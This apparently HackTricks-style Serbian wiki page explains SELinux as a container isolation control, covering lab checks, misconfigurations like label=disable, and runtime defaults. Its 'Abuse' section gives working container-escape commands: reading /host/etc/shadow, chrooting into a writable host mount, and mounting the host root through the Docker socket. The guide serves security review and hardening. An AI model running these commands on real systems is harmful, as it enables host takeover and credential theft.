# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

SELinux je sistem **Mandatory Access Control zasnovan na oznakama**. Svaki relevantni proces i objekat mogu imati bezbednosni kontekst, a policy određuje koji domeni mogu da komuniciraju sa kojim tipovima i na koji način. U kontejnerizovanim okruženjima to obično znači da runtime pokreće proces kontejnera pod ograničenim domenom kontejnera i označava sadržaj kontejnera odgovarajućim tipovima. Ako policy pravilno funkcioniše, proces može da čita i upisuje ono što se očekuje da njegova oznaka dodiruje, dok mu je pristup drugom sadržaju hosta uskraćen, čak i kada taj sadržaj postane vidljiv kroz mount.

Ovo je jedna od najmoćnijih zaštita sa strane hosta dostupnih u mainstream Linux container deployment-ima. Posebno je važna na Fedora, RHEL, CentOS Stream, OpenShift i drugim SELinux-centric ekosistemima. U tim okruženjima, reviewer koji zanemari SELinux često neće razumeti zašto je naizgled očigledan put do compromise-a hosta zapravo blokiran.

## AppArmor naspram SELinux-a

Najlakše objašnjiva razlika na visokom nivou jeste da je AppArmor zasnovan na putanjama, dok je SELinux **zasnovan na oznakama**. To ima velike posledice po container security. Policy zasnovan na putanjama može da se ponaša drugačije ako isti sadržaj hosta postane vidljiv pod neočekivanom mount putanjom. Policy zasnovan na oznakama umesto toga proverava koja je oznaka objekta i šta domen procesa sme da radi sa njim. To ne čini SELinux jednostavnim, ali ga čini otpornim na klasu pretpostavki zasnovanih na trikovima sa putanjama koje defenders ponekad slučajno prave u sistemima zasnovanim na AppArmor-u.

Pošto je model orijentisan na oznake, rukovanje container volume-ima i odluke o relabeling-u su od ključnog značaja za bezbednost. Ako runtime ili operator preširoko promeni oznake da bi "mount-ovi radili", granica policy-ja koja je trebalo da ograniči workload može postati mnogo slabija nego što je predviđeno.

## Lab

Da biste proverili da li je SELinux aktivan na hostu:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Da biste pregledali postojeće oznake na hostu:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Za poređenje normalnog pokretanja sa pokretanjem u kom je označavanje onemogućeno:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Na hostu sa omogućenim SELinux-om, ovo je veoma praktična demonstracija jer pokazuje razliku između workload-a koji radi u očekivanom container domain-u i onog kome je ovaj enforcement sloj uklonjen.

## Upotreba tokom rada

Podman je naročito dobro usklađen sa SELinux-om na sistemima na kojima je SELinux deo podrazumevane platforme. Rootless Podman plus SELinux predstavlja jednu od najjačih mainstream container osnova, jer je proces već unprivileged na strani hosta, a i dalje je ograničen MAC policy-jem. Docker takođe može koristiti SELinux tamo gde je podržan, iako ga administratori ponekad onemogućavaju da bi zaobišli probleme sa volume-labeling-om. CRI-O i OpenShift se u velikoj meri oslanjaju na SELinux kao deo svoje container isolation priče. Kubernetes takođe može izložiti podešavanja povezana sa SELinux-om, ali njihova vrednost očigledno zavisi od toga da li node OS zaista podržava i primenjuje SELinux.<sup>[[2]](#references)</sup>

Pouka koja se stalno ponavlja jeste da SELinux nije opciona dopuna. U ekosistemima koji su izgrađeni oko njega, on je deo očekivane security granice.

## Pogrešne konfiguracije

Klasična greška je `label=disable`. U praksi se to često dešava zato što je volume mount odbijen, pa je najbrži kratkoročni odgovor ukloniti SELinux iz jednačine umesto popraviti labeling model.<sup>[[1]](#references)</sup> Druga česta greška jeste nepravilno relabeling host sadržaja. Široke relabel operacije mogu omogućiti rad aplikacije, ali takođe mogu proširiti ono što container može da dodirne daleko izvan prvobitne namene.

Takođe je važno ne mešati **instalirani** SELinux sa **efektivnim** SELinux-om. Host može podržavati SELinux, a da se i dalje nalazi u permissive režimu, ili runtime možda ne pokreće workload u očekivanom domain-u. U tim slučajevima zaštita je mnogo slabija nego što dokumentacija može sugerisati.

## Abuse

Kada SELinux nedostaje, nalazi se u permissive režimu ili je široko onemogućen za workload, host-mounted putanje postaju mnogo jednostavnije za abuse. Isti bind mount koji bi inače bio ograničen label-ima može postati direktan put do host podataka ili izmene hosta. Ovo je naročito važno kada se kombinuje sa writable volume mount-ovima, container runtime direktorijumima ili operativnim prečicama koje su zbog praktičnosti izložile osetljive host putanje.

SELinux često objašnjava zašto generički breakout writeup odmah funkcioniše na jednom hostu, ali stalno neuspešno prolazi na drugom, iako runtime flag-ovi izgledaju slično. Element koji nedostaje često uopšte nije namespace ili capability, već label granica koja je ostala očuvana.

Najbrža praktična provera jeste poređenje aktivnog context-a, a zatim ispitivanje mount-ovanih host putanja ili runtime direktorijuma koji bi normalno bili ograničeni label-ima:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Ako je prisutan host bind mount, a SELinux označavanje onemogućeno ili oslabljeno, odavanje informacija često je prvi znak:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Ako je mount upisiv i kontejner je, iz perspektive kernela, praktično host-root, sledeći korak je testirati kontrolisanu izmenu hosta umesto nagađanja:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Na hostovima koji podržavaju SELinux, gubitak labela oko direktorijuma stanja runtime-a može takođe otkriti direktne putanje za eskalaciju privilegija:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ove komande ne zamenjuju kompletan escape chain, ali veoma brzo pokazuju da li je SELinux sprečavao pristup podacima na hostu ili izmenu fajlova na strani hosta.

### Pun primer: SELinux Disabled + Writable Host Mount

Ako je SELinux labeling onemogućen, a filesystem hosta montiran sa dozvolom za upis na `/host`, potpuni host escape postaje uobičajen slučaj zloupotrebe bind mount-a:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ako `chroot` uspe, proces kontejnera sada radi iz sistema datoteka hosta:
```bash
id
hostname
cat /etc/passwd | tail
```
### SELinux onemogućen + Runtime direktorijum

Ako workload može da dosegne runtime socket kada su labels onemogućene, escape se može prepustiti runtime-u:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Relevantno zapažanje je da je SELinux često bio mehanizam kontrole koji je sprečavao upravo ovakvu vrstu pristupa putanjama hosta ili stanju runtime-a.

## Provere

Cilj SELinux provera je da potvrde da je SELinux omogućen, utvrde trenutni bezbednosni kontekst i provere da li su datoteke ili putanje koje vas zanimaju zaista ograničene labelama.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Šta je ovde zanimljivo:

- `getenforce` bi u idealnom slučaju trebalo da vrati `Enforcing`; `Permissive` ili `Disabled` menja značenje celog odeljka o SELinux-u.
- Ako kontekst trenutnog procesa izgleda neočekivano ili preširoko, workload možda ne radi pod predviđenom container policy.
- Ako fajlovi montirani sa hosta ili runtime direktorijumi imaju labele kojima proces može pristupati previše slobodno, bind mounts postaju mnogo opasniji.

Prilikom provere containera na platformi koja podržava SELinux, nemojte labeling posmatrati kao sporedan detalj. U mnogim slučajevima, upravo je on jedan od glavnih razloga zbog kojih host još nije kompromitovan.

## Podrazumevane vrednosti runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Zavisno od hosta | SELinux separation je dostupna na hostovima sa omogućenim SELinux-om, ali tačno ponašanje zavisi od konfiguracije hosta/daemon-a | `--security-opt label=disable`, široko relabelovanje bind mount-ova, `--privileged` |
| Podman | Obično omogućen na SELinux hostovima | SELinux separation je uobičajen deo Podman-a na SELinux sistemima, osim ako nije onemogućen | `--security-opt label=disable`, `label=false` u `containers.conf`, `--privileged` |
| Kubernetes | Obično se ne dodeljuje automatski na nivou Pod-a | SELinux podrška postoji, ali Pod-ovima su obično potrebni `securityContext.seLinuxOptions` ili podrazumevane vrednosti specifične za platformu; potrebna je podrška runtime-a i node-a | slabi ili preširoki `seLinuxOptions`, pokretanje na permissive/disabled node-ovima, platform policies koje onemogućavaju labeling |
| CRI-O / OpenShift style deployments | Često se u velikoj meri oslanjaju na njega | SELinux je često ključni deo modela izolacije node-ova u ovim okruženjima | custom policies koje previše proširuju pristup, onemogućavanje labeling-a radi kompatibilnosti |

SELinux podrazumevane vrednosti više zavise od distribucije nego seccomp podrazumevane vrednosti. Na Fedora/RHEL/OpenShift-style sistemima, SELinux je često ključan za model izolacije. Na sistemima koji ne koriste SELinux, on jednostavno ne postoji.

## Reference

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
